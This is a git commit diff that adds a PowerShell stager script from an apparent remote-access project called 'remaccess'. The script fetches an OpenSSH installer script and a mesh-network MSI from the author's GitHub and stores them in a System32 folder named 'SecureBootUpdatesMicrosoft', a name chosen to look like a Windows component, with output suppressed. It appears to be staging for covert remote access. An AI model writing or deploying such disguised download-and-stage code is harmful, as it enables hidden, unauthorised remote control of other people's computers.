e6a92bcbc1fcd800cc186fdd1459ccb8085cf969
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-28 22:54:44 +0500

    Add files via upload

---
+++ CoreFiles/PreampCoreDownload.ps1
@@ -0,0 +1,55 @@
+#SSH DL
+$downloadUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
+$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
+$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
+$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
+$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+function Write-VerboseMessage($message) {
+    if ($VerboseOutput) {
+        Write-Host $message
+    }
+}
+if (-not (Test-Path (Split-Path $destinationPath))) {
+    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
+}
+if (Test-Path $destinationPath) {
+    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
+    $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
+    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
+    if ($hashesData -match $hashRegex) {
+        $programHash = $matches[1]
+    }
+    if ($programHash -eq $existingFileHash) {
+        Write-VerboseMessage "File is already present and matches the hash. No action needed." | Out-Null
+    } else {
+        Remove-Item -Path $destinationPath -Force
+    }
+}
+if (-not (Test-Path $destinationPath)) {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
+}
+#Zt Dl
+$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
+$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
+$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
+$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
+$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+if (-not (Test-Path (Split-Path $destinationPath))) {
+    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
+}
+if (Test-Path $destinationPath) {
+    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
+    $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
+    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
+    if ($hashesData -match $hashRegex) {
+        $programHash = $matches[1]
+    }
+    if ($programHash -eq $existingFileHash) {
+        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
+    } else {
+        Remove-Item -Path $destinationPath -Force
+    }
+}
+if (-not (Test-Path $destinationPath)) {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
+}
